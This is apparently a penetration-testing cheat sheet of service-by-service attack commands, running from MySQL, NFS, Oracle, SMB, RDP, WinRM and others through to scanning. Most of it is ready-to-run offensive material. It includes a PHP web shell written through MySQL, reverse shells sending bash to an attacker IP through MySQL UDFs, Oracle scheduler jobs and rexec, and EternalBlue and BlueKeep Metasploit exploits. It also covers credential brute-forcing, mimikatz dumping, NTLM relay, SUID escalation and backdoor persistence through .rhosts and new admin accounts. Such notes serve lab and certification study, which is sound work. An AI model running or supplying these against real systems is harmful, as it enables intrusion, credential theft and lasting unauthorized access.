msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Connecting to DB
docs.text:
mysql -h <target-ip> -u <username> -p

Note: If TLS error, try adding --skip-ssl-verify-server-cert

  • try using -u root without a password

Check for default credentials: 

root:root
admin:admin
mysql:mysql
test:test

docs.title: Enumerating DB & Tables
docs.text:
List users: 

SELECT user, host FROM mysql.user;

Check user privileges: 

SHOW GRANTS FOR 'user'@'host';

List DBs 

SHOW databases;

Select DB: 

use database_name;

List tables in DB: 

show tables;

Dump data into file: 

SELECT * INTO OUTFILE '/var/www/html/dump.txt' FROM table_name;

docs.title: Writing Files
docs.text:
If the MySQL user has FILE privileges, we can create a backdoor and obtain a web shell: 

SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

Then access via: 

http://target/shell.php?cmd=id

docs.title: Obtaining Shell via sys_exec or UDF Exploits
docs.text:
If User Defined Functions (UDFs) are enabled, execute system commands: 1. Upload malicious shared object (.so) file 

CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

  1. Execute commands 
    SELECT sys_exec('nc -e /bin/bash <attacker-ip> <port>');

docs.title: MySQL (Linux)
docs.text:
If MySQL runs as root, escalate privileges by writing to .ssh/authorized_keys 

SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/root/.ssh/authorized_keys';

Then login via SSH as root: 

ssh -i <key> root@<target>

docs.title: User Grants
docs.text:
If a low-privileged user has FILE or EXECUTE privileges, escalate privileges. Check for dangerous privileges: 

SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE' OR privilege_type='EXECUTE';

Enable SUDO privileges: 

GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' IDENTIFIED BY 'newpassword' WITH GRANT OPTION;
FLUSH PRIVILEGES;

docs.title: Retrieving Password Hashes
docs.text:
Dump user hashes: 

SELECT host, user, authentication_string FROM mysql.user;

Crack with Hashcat: 

hashcat -m 300 hashes /usr/share/wordlists/rockyou.txt

docs.title: NFS (2049)
docs.text:
Start here

List exports without credentials: showmount -e <target>. If shares are listed, mount and browse immediately: mount -t nfs <target>:/share /mnt/nfs. Look for no_root_squash in /etc/exports — if present, you can drop a SUID binary as root from your attacker machine.

docs.title: Check for Open NFS Ports
docs.text:
sudo nmap --script="nfs*" <target-ip> -sV -p111,2049

Using Showmount: 

showmount -e <target-ip>

NOTE: If "everyone" or "no authentication" is found, the NFS shares are publicly accessible.

docs.title: Mounting Shares (Anonymous Access)
docs.text:
Mount available NFS shares to locally access their content: Create local directory for mounting share: 

mkdir /mnt/nfs
sudo mount -t nfs <target-ip>:/home/user/public /mnt/nfs
ls -la /mnt/nfs

If successful, browse for sensitive files: 

/etc/passwd
/home/user/.ssh/id_rsa
/var/log/auth.log

docs.title: Insecure File Permissions & Root Squashing
docs.text:
If no_root_squash is enabled, attackers can write root-owned files. Check NFS config: 

cat /etc/exports

If the output contains: 

/home *(rw,no_root_squash)
Then root access is not restricted.

docs.title: Exploiting No Root Squashing
docs.text:
1. Create a Root-Owned file: 
    touch /mnt/nfs/rootfile
chown root:root /mnt/nfs/rootfile
  2. Execute Commands as Root If NFS is used for system-wide configuration, modifying certain files (e.g., /etc/crontab) could lead to code execution as root.

docs.title: SSH Key Injection for Remote Access
docs.text:
Insert SSH public key into authorized_keys if .ssh directory is accessible: 

echo "<your-public-key>" >> /mnt/share/home/user/.ssh/authorized_keys

Then log in directly with SSH.

docs.title: Privilege Escalation via Writable NFS Shares
docs.text:
If the NFS share is writable, attackers can escalate privileges by uploading a SUID binary. Create the SUID Binary: 

echo -e '#!/bin/bash\n/bin/bash -p' > /mnt/nfs/suid_bin
chmod +x /mnt/nfs/suid_bin

On the target machine: 

/mnt/nfs/suid_bin
id

If successful, privileges are escalated to root.

docs.title: Oracle TNS (1521)
docs.text:
Start here

Enumerate SIDs first — you can't connect without one: odat.py sidguesser -s <target>. Once you have a SID, try default credentials: SCOTT:tiger, SYS:oracle, SYSTEM:manager. Connect with sqlplus <user>/<pass>@<target>:1521/<SID>.

docs.title: Check for Open Oracle TNS Port
docs.text: nmap -p 1521 --script oracle-tns-version,oracle-sid-brute,oracle-enum-users <target-ip>

docs.title: Enumerating Oracle SIDs
docs.text:
Oracle databases use SIDs (System Identifiers) to differentiate instances. Knowing the correct SID is required for authentication. 

odat.py sidguesser -s <target-ip>
odat.py passwordguesser -s <target-ip> -d <SID>
https://github.com/quentinhardy/odat

docs.title: Connecting to Oracle DB (SQLplus)
docs.text: sqlplus username/password@<target-ip>:1521/SID

docs.title: Common Credentials
docs.text:
SYS:oracle
SYSTEM:manager
SCOTT:tiger
HR:hr
DBSNMP:dbsnmp

docs.title: Exploiting Misconfigurations
docs.text:
If the TNS Listener is unauthenticated, attackers can:

  • Retrieve database information
  • Modify database connections
  • Perform DoS attacks

Check TNS Listener Status: 

lsnrctl status

docs.title: PE in Oracle DBs
docs.text:
Check for privilege escalation via PL/SQL injection or privilege misconfigurations once connected: Check privileges of the current user: 

SELECT * FROM session_privs;

Attempt privilege escalation (via SQL Injection in PL/SQL): 

DECLARE
  pragma autonomous_transaction;
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO username';
END;

If an account has DBA privileges: 

BEGIN
DBMS_SCHEDULER.CREATE_JOB (
   job_name => 'shell_job',
   job_type => 'EXECUTABLE',
   job_action => '/bin/bash -c "nc -e /bin/bash <attacker-ip> <port>"',
   enabled => TRUE);
END;
/

Start an NC listener and get a shell on that BB.

docs.title: Exploiting UTL_HTTP for SSRF
docs.text: SELECT UTL_HTTP.REQUEST('http://<attacker-ip>/malicious_script.sh') FROM dual;

docs.title: Password Hash Extraction (Oracle Hashes)
docs.text:
SELECT name, password FROM sys.user$;

hashcat -m 3100 hashes.txt /usr/share/wordlists/rockyou.txt

docs.title: Remote Command Execution
docs.text:
If Java is enabled (Oracle JVM), execute OS commands through Oracle DB: 

exec dbms_java.grant_permission('PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');

Use known Java methods to spawn OS commands for reverse shells or file manipulation.

docs.title: Enumerating Privileged Users
docs.text: SELECT username, account_status FROM dba_users WHERE account_status='OPEN';

docs.title: Pivoting via Linked DBs
docs.text:
If DB links exist, exploit them to access remote databases: 

SELECT * FROM dba_db_links;

Execute commands on a linked DB: 

EXEC ('SELECT * FROM users') AT [LINKED_DB];

docs.title: POP3 (110, 995)
docs.text:
Start here

Connect directly: nc <target> 110 then USER <username> / PASS <password>. Once authenticated, LIST shows available messages and RETR 1 downloads the first one. Emails often contain credentials, password resets, or internal info worth reading before moving on.

docs.title: Banner Grabbing
docs.text: nmap -p 110,995 -sV --script=pop3-capabilities <target-ip>

docs.title: User Enumeration
docs.text: nmap --script pop3-brute -p 110 <target-ip>

docs.title: Brute Force Credentials
docs.text:
hydra -L users.txt -P passwords.txt -s 995 <target-ip> pop3s -V

Metasploit: 

msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Insecure Authentication
docs.text:
If authentication is in cleartext (port 110) and TLS is not enforced, credentials may be sniffed using tcpdump or wireshark. 

tcpdump -i eth0 port 110 -A

Some POP3 servers allow plaintext authentication (PLAIN or LOGIN methods), which can be intercepted over unencrypted connections. 

openssl s_client -connect <target-ip>:110 -starttls pop3

Check for AUTH PLAIN or AUTH LOGIN in the response:

docs.title: Post-Exploitation & Lateral Movement
docs.text:
If POP3 credentials are compromised:

  1. Check for IMAP Access (Port 143/993) – The same credentials might work for IMAP, allowing deeper email access.
  2. Try SMTP Authentication (Port 25/465/587) – If SMTP allows authentication, send emails as the victim.
  3. Re-use Credentials for Other Services – Many users reuse passwords, allowing privilege escalation across different services.
  4. Pivot to Internal Systems – If the compromised user is an IT administrator, access internal infrastructure.

docs.title: R-Services (512-514)
docs.text:
Start here

Try passwordless rlogin immediately: rlogin -l root <target> — if .rhosts contains + + or the target trusts your source IP, you get a shell with no credentials. Also try rsh -l root <target> id to test rsh trust. These services are rare but almost always misconfigured when present.

docs.title: Checking for Open R-Service Ports
docs.text:
nmap -p 512-514 --script=rexec-brute,rsh-brute,rlogin-brute <target-ip>

Check supported authentication methods explicitly: 

nmap -p 513 --script=rlogin-enum <target-ip>
nmap -p 514 --script=rsh-enum <target-ip>

docs.title: Checking for Rlogin Trust files
docs.text:
Rlogin trusts ~/.rhosts and /etc/hosts.equiv files for password-less authentication. Check if authentication works without a password: 

rlogin -l username <target-ip>

  • If no username is known, try using root, admin, or user.

docs.title: Persistence
docs.text:
If Rlogin allows access, modify .rhosts to enable persistent access: 

echo "+ +" > ~/.rhosts
chmod 600 ~/.rhosts

docs.title: Brute-Forcing R-Services
docs.text:
Hydra: 

hydra -L users.txt -P passwords.txt rexec://<target-ip>

MSF: 

msfconsole
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Remote Shell Exploitation (rsh)
docs.text:
rsh -l root <target-ip> "id; uname -a; whoami"

If successful, directly access interactive shell: 

rsh -l root <target-ip>

docs.title: RCE via Rexec
docs.text:
rexec <target-ip> -l user -p password "id"

Execute a reverse shell: 

rexec <target-ip> -l user -p password "nc -e /bin/bash <attacker-ip> <port>"

Start a listener: 

nc -lvnp <port>

docs.title: Remote Execution with Plaintext Creds
docs.text:
If credentials were found or obtained previously, attempt remote execution using rexec: 

rexec -l username -p password <target-ip> "id; uname -a"

docs.title: RDP (3389)
docs.text:
Start here

With valid credentials, connect directly: xfreerdp /u:<user> /p:<pass> /v:<target>. For pass-the-hash: xfreerdp /u:<user> /pth:<ntlm_hash> /v:<target> (requires Restricted Admin mode enabled).

Watch out

RDP brute force creates Event ID 4625 (failed logon) entries rapidly. Avoid brute force unless you have confirmed lockout thresholds.

docs.title: Check for Open RDP Ports
docs.text:
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 <target-ip>

Confirm RDP is open using xfreerdp: 

xfreerdp3 /u:"user" /p:"pass" /v:192.168.162.145 /clipboard +drive:smbfolder,/home/taylor/Desktop/kali/Cracks /dynamic-resolution

xfreerdp with NTLM hash: 

xfreerdp3 /u:"user" /pth:<NTLM-hash> /v:192.168.162.145 /clipboard +drive:smbfolder,/home/taylor/Desktop/kali/Cracks /dynamic-resolution

or using Impacket: 

impacket-smbexec <domain>/<user>@<target-ip> -hashes :<NTLM-hash>

docs.title: Brute-Force Credentials
docs.text:
Hydra: 

hydra -L users.txt -P passwords.txt rdp://<target-ip>

Ncrack: 

ncrack -p 3389 -U users.txt -P passwords.txt <target-ip>

MSF: 

msfconsole
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Exploiting BlueKeep (CVE-2019-0708)
docs.text:
BlueKeep allows unauthenticated remote code execution on vulnerable RDP servers.

Check for vulnerability: 

nmap -p 3389 --script rdp-vuln-ms12-020 <target-ip>

Exploit via MSF: 

msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit

docs.title: Extracting Cached Credentials
docs.text:
Once inside, extract passwords using mimikatz: 

mimikatz # sekurlsa::logonpasswords

docs.title: Pivoting via RDP
docs.text: DON'T FORGET to try credentials across all targets.

docs.title: Rsync (873)
docs.text:
Start here

List modules (shares) anonymously: rsync -av --list-only rsync://<target>. If modules appear, try downloading without credentials: rsync -av rsync://<target>/<module> ./. Look for SSH keys, config backups, and database dumps in the pulled files.

docs.title: Check for Open Rsync Port
docs.text: nmap -p 873 --script rsync-list-modules <target-ip>

docs.title: List Accessible Rsync Modules (Shares)
docs.text:
If Rsync allows anonymous or unauthenticated access, attempt to list or download files: 

rsync -av --list-only rsync://<target-ip>

docs.title: Entire module (recursive)
docs.text: rsync -av rsync://<target-ip>/module_name ./local_folder

docs.title: Specific Folder
docs.text: rsync -av rsync://<target-ip>/module_name/file.txt ./

docs.title: Uploading Files via Rsync
docs.text:
Assuming the module is writeable, attempt to upload files or malicious payloads: 

rsync -av ./localfile rsync://<target-ip>/module_name/

Verify uploaded files by attempting to download them again. Reference download command.

docs.title: Brute Forcing
docs.text: hydra -L users.txt -P passwords.txt rsync://<target-ip>

docs.title: Stealing SSH Keys for Lateral Movement
docs.text:
If SSH keys are exposed: 

rsync -av rsync://<target-ip>/home/user/.ssh/id_rsa .

docs.title: Modifying Rsync Configuration for Persistence
docs.text:
If access to /etc/rsyncd.conf is obtained, modify settings to maintain persistence: 

echo "uid = 0" >> /etc/rsyncd.conf

Restart service: 

systemctl restart rsync

docs.title: SMB (139, 445)
docs.text:
Start here

First check: netexec smb <target> -u '' -p '' (null session). If that fails, try guest:guest. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

docs.title: Check for Availability
docs.text:
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode,smb2-capabilities $IP

CrackMapExec: 

crackmapexec smb $IP
Provides quick system information, user enumeration, and SMB version detection.

Validate username/password: 

crackmapexec smb $IP -u users.txt -p "Password"

docs.title: Listing Shares Anonymously
docs.text: smbclient -L //$IP --option="client min protocol=core" -U ''

docs.title: List SMB Shares
docs.text:
Unsure of login credentials: 

smbclient -L //$IP -U guest

  • If prompted for a password, try an empty password, guest, or anonymous
nmap --script smb-enum-shares -p 445 $IP

Below is a special case use. This will take care of shares with spaces in the name, users on a different domain (for AD), and using a valid username/password: 

smbclient -L "//192.168.243.175/My Share" -U "DOMAIN/username%password"

docs.title: Enum4linux
docs.text:
enum4linux -a $IP
- -a: Runs all enumeration options (users, shares, password policies, etc.). - -G: Grabs group membership from the target. - -o: Output the results to a file. - -i: Information about the target system (OS version).

docs.title: Enum4linux-ng
docs.text:
The next-generation version of enum4linux. Provides similar output, however, both should be used in parallel: 

enum4linux-ng -A $IP

docs.title: Null Sessions
docs.text:
Attempt to connect to any null sessions of specific shares: 

smbclient //10.0.0.0/SHARE -N

docs.title: Using Enum4Linux
docs.text: enum4linux -U $IP

docs.title: Brute Force SMB Credentials
docs.text:
CrackMapExec: 

crackmapexec smb $IP -u users.txt -p passwords.txt

Hydra: 

hydra -L users.txt -P passwords.txt smb://$IP -V

Metasploit: 

msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Downloading Content
docs.text:
Single file: 

smb> get file

Directory: 

smb> mget *

docs.title: Anonymous Login
docs.text:
First, check to see if anonymous login is allowed. If any public shares are found, we can use the following to log in: 

smbclient //$IP/SHARE -U guest

docs.title: EternalBlue (MS17-010)
docs.text:
Check for vulnerability: 

nmap -p 445 --script smb-vuln-ms17-010 $IP

If present, follow instructions below: https://github.com/3ndG4me/AutoBlue-MS17-010

Or, if available, use MSF: 

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit

docs.title: SMBGhost (CVE-2020-0796)
docs.text:
Check for vulnerability: 

nmap -p 445 --script smb-vuln-cve-2020-0796 $IP

If present, follow instructions below: https://github.com/jamf/CVE-2020-0796-RCE-POC

docs.title: Upload a Malicious File
docs.text: Assuming we have write access to the SMB, we could obtain a reverse shell by uploading nc.exe for example into the share, then start a NC listener on the attacking machine.

docs.title: Pass-the-Hash (Pth)
docs.text:
If we've gained NTLM credentials, we can try a PtH attack: 

crackmapexec smb $IP -u Administrator -H <NTLM-hash>

OR using Impacket's SMBExec: 

impacket-smbexec <DOMAIN>/<user>@$IP -hashes :<NTLM-hash>

docs.title: Enumerating SMB Shares & Users
docs.text: crackmapexec smb $IP --shares

docs.title: RCE via SMB
docs.text:
If an administrator account is compromised: 

crackmapexec smb $IP -u admin -p password --exec "whoami"

docs.title: Extracting Password Hashes
docs.text:
Retrieve NTLM hashes from SMB: 

secretsdump.py <domain>/<user>@$IP

docs.title: Relay Attack
docs.text:
Use Responder and Impacket’s ntlmrelayx to relay authentication requests, potentially gaining immediate access to SMB or other services:

Start responder: 

responder -I eth0 -rdwv

SMB Relay Attack (with Impacket): 

ntlmrelayx.py -tf targets.txt -smb2support

docs.title: SMTP (25, 465, 587)
docs.text:
Start here

Enumerate users via VRFY: smtp-user-enum -M VRFY -U users.txt -t <target>. If VRFY is disabled, try EXPN or RCPT TO. User enumeration gives you a valid username list for password spraying against other services (SMB, WinRM, RDP).

docs.title: Banner Grabbing
docs.text:
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay <target-ip>

nc -nv <target-ip> <25,587>

Cross reference the version for vulnerabilities in exploit-DB.

docs.title: Enumerate SMTP Users
docs.text:
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN} <target-ip>
  • VRFY: Verify if a user exists.
  • EXPN: Expand mailing lists, potentially revealing email addresses.

Metasploit: 

msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target-ip>
run

docs.title: Open Relaying (Unauthenticated Email Sending)
docs.text: nmap --script smtp-open-relay -p 25,465,587 <target-ip>

docs.title: Brute-Force SMTP Authentication
docs.text:
hydra -L users.txt -P passwords.txt -s 25 <target-ip> smtp

Metasploit: 

msfconsole
use auxiliary/scanner/smtp/smtp_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: SMTP Open Relay
docs.text:
An Open Relay allows sending email from any domain without authentication. Attackers commonly exploit this to send spam, phishing emails, or spoof messages. 

nmap -p25 --script smtp-open-relay <target-ip>

docs.title: Exploiting Misconfigurations
docs.text:
If you confirm an open relay exists, you can send spoofed emails using command-line tools: Using sendemail: 

sendemail -f spoofed@example.com -t victim@target.com -s <target-ip>:25 -u "Subject Here" -m "Your message here."

  • -f: Sender email address (spoofed).
  • -t: Recipient.
  • -s: SMTP server IP and port.

docs.title: IMPORTANT
docs.text:
If this port is open, refer to the [[SNMP (161, 162)|SNMP Services]] page to see if SNMP is open. If so, use the commands to enumerate SNMP further and attempt to search for exploits for any processes or other valuable information returned from the nmap scan.

Start here

UDP 199 alone rarely yields direct exploits — pivot to the main SNMP page and run snmpwalk -v2c -c public <target> against port 161. If port 161 is filtered but 199 is open, the SNMP MUX may still forward queries: try snmpwalk -v1 -c public <target>:199.

docs.title: Overview
docs.text:
SNMP Multiplexer (SNMP MUX) running over UDP port 199 facilitates communication between multiple SNMP subsystems by forwarding SNMP queries to the appropriate SNMP engine.

While SNMP MUX may not be directly vulnerable/exploitable, it can be paired with SNMP enumeration to extract valuable information for exploitation of the target machine.

docs.title: SNMP (161, 162)
docs.text:
Start here

Default community string is public. Try: snmpwalk -v2c -c public <target>. If it returns data, enumerate further with snmp-check <target> for users, processes, and network interfaces.

Watch out

SNMPv1/v2c sends community strings in plaintext. If you capture the community string, you can query the full MIB. SNMPv3 requires credentials — brute force is slow.

docs.title: Check for Open SNMP Ports
docs.text:
sudo nmap -sU -p161 --script="*snmp*" $IP

Reference any services, or other valuable information returned from the above scan, with searchsploit to identify potential attack vectors.

docs.title: String Enumeration
docs.text: nmap -sU -p 161 --script=snmp-brute $IP

docs.title: SNMP Enumeration w/ valid Community String
What is an SNMP Community String?
docs.text:
An SNMP community string acts as a password that controls access to SNMP-enabled network devices. There are typically two types of community strings:

  • Read-only (public): Commonly used default, allowing viewing (enumerating) of device configurations and status.
  • Read-write (private): Allows viewing and modifying device configurations.

Misconfigured or default community strings are commonly found, providing attackers with substantial device information or control.

docs.title: How to Find SNMP Community Strings
docs.text:
Enumerating community strings usually involves brute-forcing default or common values. 

nmap -sU -p 161 --script=snmp-brute $IP

docs.title: Enumerating SNMP Information
docs.text:
snmpwalk -c public -v1 $IP
  • This assumes the public community string is valid

docs.title: Retrieving System & User Information
docs.text:
snmpwalk -c public -v1 $IP 1.3.6.1.2.1.1
  • 1.3.6.1.2.1.1 → General system information.

Extracting User Accounts: 

snmpwalk -c public -v1 $IP 1.3.6.1.4.1.77.1.2.25

List Running Processes: 

snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.4.2.1.2

Extract Installed Software: 

snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.6.3.1.2

docs.title: Post-Exploitation & Lateral Movement
docs.text:
Identify Administrator workstations: 

snmpwalk -c public -v1 $IP 1.3.6.1.2.1.25.1.6

Check for open services (useful for brute-force attacks): 

snmpwalk -c public -v1 $IP 1.3.6.1.2.1.6.13.1.3

docs.title: SSH (22)
docs.text:
Start here

Enumerate supported auth methods: ssh -v user@<target> — look for publickey,password vs publickey only. If password auth is enabled and you have a username, it's bruteforceable. Check for weak keys: ssh-audit <target>.

docs.title: Banner Grabbing
docs.text: nmap -p22 -sV --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $IP

docs.title: Example
docs.text:
Some older versions of OpenSSH allow timing-based user enumeration: 

nmap --script ssh-user-enum -p22 --script-args userdb=users.txt $IP

docs.title: Brute-Force Credentials
docs.text:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP

Metasploit: 

msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Uploading id_rsa.pub onto Target for SSH Access
docs.text:
If the target allows, you might be able to add your public key to the .ssh/authorized_keys to allow you SSH access.

First, you need to write your public key to the target's authorized_keys. 

kali $ cat /home/taylor/.ssh/id_rsa.pub
ssh-ed25-- SNIPPET --r3pCGS taylor@kali

Copy the key and use it in the following way on the target. 

echo "ssh-ed25-- SNIPPET --r3pCGS taylor@kali" > /home/root/.ssh/authorized_keys

  • You can do this with limited shell access or if you find a vulnerability which allows you to write files to the target
  • You may need to mkdir /home/user/.ssh/ before executing the command

After the file has been created, we just need to use the id_rsa from kali to SSH onto the target. 

ssh -i /home/taylor/.ssh/id_rsa user@$IP

docs.title: Identifying Keys
docs.text:
grep -rnw "./" -e "PRIVATE KEY"

or

find / -name id_rsa -type f 2>/dev/null

If you gain access to the target, look for private keys in:

  • /home/user/.ssh/id_rsa
  • /root/.ssh/id_rsa
  • Git repositories (.git/config)
  • Configuration backups (.bak, .old, .tar)

If a private key is found: 

chmod 600 id_rsa
ssh -i id_rsa user@$IP

docs.title: Tunneling & Port Forwarding
docs.text:
If you want to forward an internal service (e.g., MySQL on 3306) to your local machine: 

ssh -L 3306:localhost:3306 user@$IP

Note: Ligolo-ng is another option to completely forward the network.

docs.title: TFTP (69)
docs.text:
Start here

TFTP has no authentication — try fetching common config files immediately: atftp --get --remote-file running-config --local-file running-config <target> and atftp --get --remote-file startup-config --local-file startup-config <target>. Network device configs often contain SNMP community strings and credentials.

docs.title: Automatic Enumeration
docs.text:
atftp --get --remote-file <filename> --local-file <filename> <target-ip>

Common files to target: 

running-config
startup-config
passwd
shadow
bootloader.cfg

docs.title: Nmap
docs.text:
nmap -sU -p 69 --script tftp-enum <target-ip>

Afterwards, check if the service is available with Netcat: 

nc -vnzu <target-ip> 69

docs.title: Check Anonymous Read/Write Access
docs.text:
Unlike FTP, TFTP does not require authentication, making it high-risk if misconfigured.

Python script to fetch common configuration files: 

#!/usr/bin/python3
import os

target = "<target-ip>"
wordlist = ["config.cfg", "startup-config", "router.conf", "network.txt", "backup.img"]

for filename in wordlist:
    os.system(f"tftp {target} -c get {filename}")

If you can download config files, look for:

  • Stored passwords (username = admin, password = cisco)
  • SNMP strings (community = public)
  • Device IPs (for lateral movement)
  • Backup images (firmware analysis)

Commonly targeted files:

  • config
  • router.cfg
  • running-config
  • startup-config
  • passwords.txt
  • backup.cfg

docs.title: Write Access Privilege Escalation
docs.text:
If the TFTP server allows file uploads, you may be able to overwrite configuration files or deploy malicious scripts, such as .php reverse shells, to obtain a shell.

Reference: [[FTP (21)#Exploiting Misconfigurations]]

docs.title: Lateral Movement
docs.text:
If the TFTP server is used for PXE booting, it may contain disk images.

Download the boot files: 

tftp> get pxelinux.0
tftp> get boot.cfg

If a PXE boot file is writable, you could replace it with a malicious script to obtain a shell: 

tftp <target-ip>
tftp> put malicious_pxeboot.efi
On reboot, devices will execute attacker-controlled boot images.

docs.title: WinRM (5985, 5986)
docs.text:
Start here

evil-winrm -i <target> -u <user> -p <pass> is the fastest path to a shell with valid credentials. WinRM runs on port 5985 (HTTP) or 5986 (HTTPS) — check both. Pass-the-hash also works: evil-winrm -i <target> -u <user> -H <ntlm_hash>.

docs.title: Check for Open WinRM Ports
docs.text:
nmap -p 5985,5986 --script http-winrm-info,winrm-brute <target-ip>

CrackMapExec: 

crackmapexec winrm <target-ip>

Confirm manually using cURL: 

curl -vk http://<target-ip>:5985/wsman

A successful response indicates WinRM is active.

docs.title: Brute-Force Credentials
docs.text:
CrackMapExec: 

crackmapexec winrm <target-ip> -u users.txt -p passwords.txt

MSF: 

msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

docs.title: Evil-winrm
docs.text:
evil-winrm -i $IP -u user -p password

evil-winrm -i TARGET -u admin -H NTLM_HASH

docs.title: Show WinRM Options
docs.text: evil-winrm > menu

docs.title: Post-Exploitation & Lateral Movement
docs.text:
CrackMapExec for authenticated RCE execution: 

crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"

Further reconnaissance: 

Get-NetComputer -Domain domain.local
Get-NetUser -Domain domain.local

docs.title: Extracting Credentials from Memory
docs.text:
Once inside, use mimikatz: 

mimikatz # sekurlsa::logonpasswords

docs.title: Adding a New Administrator User
docs.text:
net user pentest Password123! /add
net localgroup administrators pentest /add

docs.title: Pivoting via WinRM
docs.text:
DON'T FORGET to try credentials on all targets!

Execute commands via CrackMapExec: 

crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"

docs.title: Overview
docs.text:
Tip

Network scanning order: host discovery → top-port scan → targeted full scan → service/version detection → script/vuln scans. Don't skip straight to aggressive scans — a fast initial sweep lets you start enumeration while deeper scans run in the background.

docs.title: Network Scanning
docs.text:
Goal Command Fast host discovery (no port scan) nmap -sn <range> Quick top-1000 ports nmap -sV --open <target> Full TCP scan nmap -p- -sV --open <target> UDP (slow, targeted) nmap -sU -p 53,161,500,4500 <target> Aggressive (scripts + OS + traceroute) nmap -A <target> Script scan on open ports nmap -sC -sV -p <ports> <target> Firewall evasion nmap -sS -f --mtu 8 <target>

Tip

Run a fast top-port scan first (nmap -sV --open <target>), note open ports, then do a targeted full scan (nmap -p- <target>) in the background. Don't wait for the full scan before starting enumeration.

Watch out

-A and --script=vuln are loud — they trigger IDS rules. On real engagements, start with -sS SYN scans and escalate. On HTB, noise doesn't matter — scan aggressively to save time.

docs.title: Rustscan
docs.text:
rustscan -a $IP --ulimit 5000 | tee rustscan.txt

GitHub: RustScan

docs.title: Autorecon
docs.text:
AutoRecon automates enumeration by running Nmap and various other scanning tools.

autorecon -vv --only-scans $IP

GitHub: AutoRecon

docs.title: Nmap Automator
docs.text:
nmapAutomator -H $IP -t recon
https://github.com/21y4d/nmapAutomator

docs.title: Full Port Scan
docs.text: nmap -sC -sV -p- $IP -oN nmap_full.txt

docs.title: Fast Initial Port Discovery
docs.text:
set -gx IP $IP
set -gx ports (sudo nmap -sS -p- -T3 -n --open --min-rate 300 --max-retries 3 --host-timeout 10m $IP -oG - \
  | awk -F'Ports: ' '/Ports: / {print $2}' \
  | tr -d ' ' \
  | tr ',' '\n' \
  | awk -F'/' '$2=="open" {print $1}' \
  | tr '\n' ',' \
  | sed 's/,$//') \
&& echo $ports

docs.title: Service Enumeration
docs.text: sudo nmap -sS -p$ports -sC -sV -T3 -n --version-all -oG scan_tcp $IP

docs.title: Comprehensive UDP Scan
docs.text: sudo nmap -sU --top-ports 1000 --min-rate=1000 -T4 -sC -sV -oA scan_udp $IP

docs.title: OS Detection
docs.text: nmap -O --osscan-guess $IP

docs.title: Basic Scan
docs.text: nmap -sV -sC -oA scan $IP

docs.title: Full Port Scan
docs.text: nmap -p- -T4 -oA full_scan $IP

docs.title: Full Vulnerability Scan
docs.text: nmap -v -sS -Pn --script vuln --script-args=unsafe=1 -oA full_vuln_scan $IP

docs.title: Vulners Vulnerability Script
docs.text: nmap -v -sS -Pn --script nmap-vulners -oA full_vuln_scan $IP

docs.title: SMB Vulnerability Scan
docs.text: nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan $IP

docs.title: Banner Grabbing with Netcat
docs.text: nc -nv $IP 80

docs.title: Web Enumeration with Nikto
docs.text: nikto -h http://$IP

docs.title: Top 20 Port Sweep
docs.text: nmap -sT -A --top-ports=20 $IP -oG top_ports_scan.txt

docs.title: Reconnaissance
docs.text:
Tip

Start passive before going active — WHOIS, Shodan, and Google dorking leave no trace on the target. Move to active DNS brute-forcing and port scanning only after passive recon is exhausted.

docs.title: WHOIS Enumeration
docs.text:
Retrieve domain registration details:

whois <target-domain>

Reverse lookup an IP address:

whois <target-ip>

docs.title: DNS Enumeration
docs.text:
Attempt a Zone Transfer:

dnsrecon -d <target-domain> -t axfr

Using nslookup interactively:

nslookup
> server <target-dns-server>
> set type=any
> <target-domain>

docs.title: Google Dorking
docs.text:
Find indexed PDFs related to a company:

site:<target-domain> filetype:pdf

Other useful dorks:

  • ext:xml → Find indexed XML files.

  • intitle:”index of” → Locate open directory listings.

docs.title: Shodan
docs.text:
Search for exposed assets on Shodan:

shodan search "<query>"

Example:

shodan search "Apache country:US"

docs.title: Netcraft
docs.text:
Retrieve server information:

curl -s https://www.netcraft.com | grep "<target-domain>"

